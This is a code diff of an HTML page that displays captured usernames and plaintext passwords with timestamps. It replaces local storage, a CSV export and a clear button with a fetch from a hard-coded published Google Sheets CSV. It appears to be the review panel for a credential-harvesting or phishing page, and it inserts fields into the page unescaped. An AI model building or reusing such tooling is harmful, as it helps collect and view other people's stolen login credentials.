@@ -1,69 +1,48 @@
 <!doctype html>
 <html lang="en">
 <head>
-<meta charset="utf-8" />
-<meta name="viewport" content="width=device-width,initial-scale=1" />
-<title>Trainer Review — Login Attempts</title>
-<style>
-  body{margin:0;font-family:Arial,Helvetica,sans-serif;background:#f9fafb;color:#222;padding:20px;}
-  h1{color:#2b5e90;}
-  table{width:100%;border-collapse:collapse;margin-top:20px;background:#fff;box-shadow:0 4px 12px rgba(0,0,0,0.05);}
-  th,td{border:1px solid #ddd;padding:10px;text-align:left;}
-  th{background:#2b5e90;color:#fff;}
-  tr:nth-child(even){background:#f2f2f2;}
-  .btn{margin-top:20px;padding:10px 16px;background:#4fa03e;color:#fff;border:none;border-radius:6px;cursor:pointer;margin-right:10px;}
-  .btn-clear{background:#d9534f;}
-</style>
+  <meta charset="utf-8"/>
+  <meta name="viewport" content="width=device-width,initial-scale=1"/>
+  <title>Trainer Results</title>
+  <style>
+    body{font-family:Arial, sans-serif;padding:20px;background:#f9fafb;color:#333;}
+    h1{color:#2b5e90;}
+    table{border-collapse:collapse;width:100%;background:#fff;box-shadow:0 4px 12px rgba(0,0,0,0.05);}
+    th,td{border:1px solid #e5e7eb;padding:12px;text-align:left;font-size:14px;}
+    th{background:#f3f4f6;font-weight:600;}
+  </style>
 </head>
 <body>
-  <h1>Trainer Review — Login Attempts</h1>
-  <table id="attemptsTable">
+  <h1>Trainer Results</h1>
+  <table id="resultsTable">
     <thead>
-      <tr><th>Username</th><th>Password</th><th>Time</th></tr>
+      <tr>
+        <th>Username</th>
+        <th>Password</th>
+        <th>Timestamp</th>
+      </tr>
     </thead>
     <tbody></tbody>
   </table>
 
-  <button class="btn" onclick="downloadCSV()">Download CSV</button>
-  <button class="btn btn-clear" onclick="clearAttempts()">Clear Attempts</button>
-
   <script>
-    function loadAttempts(){
-      const attempts = JSON.parse(localStorage.getItem("loginAttempts")) || [];
-      const tbody = document.querySelector("#attemptsTable tbody");
-      tbody.innerHTML = "";
-      attempts.forEach(a=>{
-        const row = `<tr><td>${a.username}</td><td>${a.password}</td><td>${a.time}</td></tr>`;
-        tbody.innerHTML += row;
-      });
+    async function loadResults(){
+      try {
+        const res = await fetch("https://docs.google.com/spreadsheets/d/e/2PACX-1vSuLy4oyOd32uVvtwYb3vpjdWSOf8WjievgXzHU0gfUGJOfoP9jZBp_3qPiOJuF29NQMpTpB6MXFSuc/pub?gid=0&single=true&output=csv");
+        const text = await res.text();
+        const rows = text.trim().split("\n").map(r=>r.split(","));
+        const tbody = document.querySelector("#resultsTable tbody");
+        tbody.innerHTML = "";
+        rows.slice(1).forEach(r=>{
+          const tr = document.createElement("tr");
+          tr.innerHTML = `<td>${r[0]}</td><td>${r[1]}</td><td>${r[2]}</td>`;
+          tbody.appendChild(tr);
+        });
+      } catch (err) {
+        alert("⚠️ Could not load results.");
+      }
     }
-
-    function clearAttempts(){
-      localStorage.removeItem("loginAttempts");
-      loadAttempts();
-    }
-
-    function downloadCSV(){
-      const attempts = JSON.parse(localStorage.getItem("loginAttempts")) || [];
-      if(attempts.length === 0){ alert("No login attempts to download."); return; }
-
-      let csv = "Username,Password,Time\n";
-      attempts.forEach(a=>{
-        csv += `"${a.username}","${a.password}","${a.time}"\n`;
-      });
-
-      const blob = new Blob([csv], {type: "text/csv"});
-      const url = URL.createObjectURL(blob);
-      const a = document.createElement("a");
-      a.href = url;
-      a.download = "login_attempts.csv";
-      document.body.appendChild(a);
-      a.click();
-      document.body.removeChild(a);
-      URL.revokeObjectURL(url);
-    }
-
-    loadAttempts();
+    loadResults();
   </script>
 </body>
 </html>
